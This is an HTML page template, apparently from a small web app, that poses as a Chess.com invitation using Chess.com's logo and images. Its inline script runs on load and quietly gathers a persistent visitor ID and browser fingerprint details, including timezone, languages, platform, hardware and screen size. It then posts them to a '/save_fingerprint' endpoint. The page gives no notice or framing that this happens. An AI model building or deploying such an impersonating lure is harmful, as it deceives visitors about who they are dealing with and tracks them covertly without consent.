<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name = "theme-color" content = "#1e1e1e">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>    Chess.com Invitation
</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 128 128%22><text y=%221.2em%22 font-size=%2296%22>⚫️</text></svg>">
        
            <link rel="stylesheet" href="{{ url_for('static', filename='fake_site.css') }}">
    
        </head>
<body>
    <div class="container">
        <img class="logo"
                src="https://storage.googleapis.com/chess-1-sandbox-us-east4-deeplink-web-assets-01/images/logo.svg"
                alt="Chess.com logo">

        <img class="image" src="https://storage.googleapis.com/chess-1-sandbox-us-east4-deeplink-web-assets-01/images/main.png" alt="Main image">

        <div class="text">
          This page checks your invitation. Click below to continue
        </div>
           
        <a href="/friend" class="button">Go to Chess.com</a>
    </div>

<script>
(async () => {
  const data = {
    visitorId: (() => {
      try {
        const k = "visitorId";
        const v = localStorage.getItem(k) || (crypto.randomUUID ? crypto.randomUUID() : String(Date.now()) + Math.random());
        localStorage.setItem(k, v);
        return v;
      } catch { return "N/A"; }
    })(),
    components: {
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      lang: navigator.language || null,
      languages: navigator.languages || null,
      platform: navigator.platform || null,
      hardwareConcurrency: navigator.hardwareConcurrency ?? null,
      deviceMemory: navigator.deviceMemory ?? null,
      screen: { w: screen.width, h: screen.height, dpr: window.devicePixelRatio || 1 },
      uaData: navigator.userAgentData ? { mobile: navigator.userAgentData.mobile } : null
    }
  };

  try {
    await fetch("/save_fingerprint", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
      keepalive: true
    });
  } catch (_) {}
})();
</script>
</body>
</html>
 
